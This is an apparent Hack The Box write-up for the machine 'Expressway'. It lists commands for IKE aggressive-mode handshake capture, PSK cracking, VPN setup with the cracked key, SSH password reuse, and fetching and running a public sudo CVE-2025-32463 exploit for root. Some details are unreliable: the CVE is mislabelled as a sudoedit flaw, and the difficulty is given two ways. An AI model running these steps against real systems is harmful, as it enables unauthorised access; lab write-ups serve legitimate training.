---
title: "HTB Machine Expressway"
date: 2025-09-22T13:28:11+02:00
draft: true 
tags: ["hackthebox", "writeup", "linux", "easy", "season 9"]
categories: ["CTF"]
---
## Machine Information
| Attribute | Value |
|-----------|-------|
| OS | Linux |
| Difficulty | Medium |
| Points | 30 |

## Summary

Expressway is a Linux machine that demonstrates VPN security vulnerabilities and recent sudo exploitation techniques. The attack path involves exploiting IKE/IPSec protocol weaknesses to gain initial access, followed by exploiting a recent sudo vulnerability (CVE-2025-32463) for privilege escalation.

## Reconnaissance

### TCP Port Scan
```bash
nmap -sCV -p- 10.129.116.251
```

**Result:** Only port 22 (SSH) open on TCP

### UDP Port Scan
Since no interesting TCP ports were found, UDP scanning revealed the actual attack surface:

```bash
nmap -sU -p 500 10.129.116.251
```

**Discovery:**
- Port 500 (ISAKMP/IKE) - VPN service detected

## Initial Access

### Phase 1: IKE Memory Leak Exploitation

Testing for Cisco IKE benigncertain vulnerability (CVE-2016-6415):

```bash
msfconsole -q
use auxiliary/scanner/ike/cisco_ike_benigncertain
set RHOSTS 10.129.116.251
set VERBOSE true
run
```

**Result:** Memory leak confirmed, revealing printable information from server memory including hostname hints.

### Phase 2: IKE Aggressive Mode Attack

#### VPN Group Enumeration
```bash
cat > groups.txt << EOF
vpn
remote
mobile
admin
default
guest
EOF
```

#### Capture IKE Handshakes
```bash
for group in $(cat groups.txt); do
  ike-scan -A -P${group}_handshake.txt --id=$group 10.129.116.251
done
```

#### Pre-Shared Key (PSK) Cracking
```bash
for handshake in *_handshake.txt; do
  psk-crack -d /usr/share/wordlists/rockyou.txt "$handshake"
done
```

**PSK Discovered:** `freakingrockstarontheroad`

### Phase 3: VPN Connection Setup

#### strongSwan Configuration

**File: /etc/ipsec.conf**
```conf
config setup
    charondebug="ike 2, knl 2, cfg 2"

conn htb
    type=transport
    keyexchange=ikev1
    authby=psk
    left=%defaultroute
    leftid=admin
    right=10.129.116.251
    rightid=ike@expressway.htb
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    aggressive=yes
    auto=start
```

**File: /etc/ipsec.secrets**
```
admin : PSK "freakingrockstarontheroad"
```

#### Establish VPN Connection
```bash
sudo ipsec stop
sudo ipsec start
sudo ipsec up htb
```

**Hostname Discovered:** `expressway.htb` (from IKE response)

### Phase 4: SSH Access

Testing password reuse with the discovered PSK:

```bash
ssh ike@10.129.116.251
# Password: freakingrockstarontheroad
```

**Success:** Logged in as user `ike`

**User Flag:** `/home/ike/user.txt`

## Privilege Escalation

### Enumeration

#### SUID Binary Discovery
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Interesting Findings:**
- `/usr/sbin/exim4`
- `/usr/local/bin/sudo` (version 1.9.17)
- `/usr/bin/sudo` (version 1.9.13p3)

#### Sudo Version Check
```bash
/usr/bin/sudo --version
```

**Output:** Sudo version 1.9.13p3

**Analysis:** Two sudo installations found - the system sudo (1.9.13p3) is vulnerable to recent CVEs.

### Group Membership Analysis
```bash
groups
```

**Output:** `ike proxy`

The `proxy` group membership indicates access to Squid proxy configurations, though this path was not necessary for this machine.

### CVE-2025-32463 Exploitation

Sudo 1.9.13p3 is vulnerable to CVE-2025-32463, a sudoedit privilege escalation vulnerability.

#### Exploit Preparation
```bash
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
chmod +x exploit.sh
```

#### Execute Exploit
```bash
./exploit.sh
```

**Result:** Root shell obtained

**Root Flag:** `/root/root.txt`

## Attack Chain Summary

1. **UDP Reconnaissance** → IKE service discovery on port 500
2. **Memory Leak (CVE-2016-6415)** → Information disclosure via Metasploit scanner
3. **IKE Aggressive Mode** → PSK hash capture using ike-scan
4. **Offline Cracking** → PSK recovery: `freakingrockstarontheroad`
5. **VPN Setup** → strongSwan configuration with recovered credentials
6. **Password Reuse** → SSH access as `ike` using PSK
7. **Enumeration** → Discovery of vulnerable sudo version (1.9.13p3)
8. **CVE-2025-32463** → sudoedit privilege escalation to root
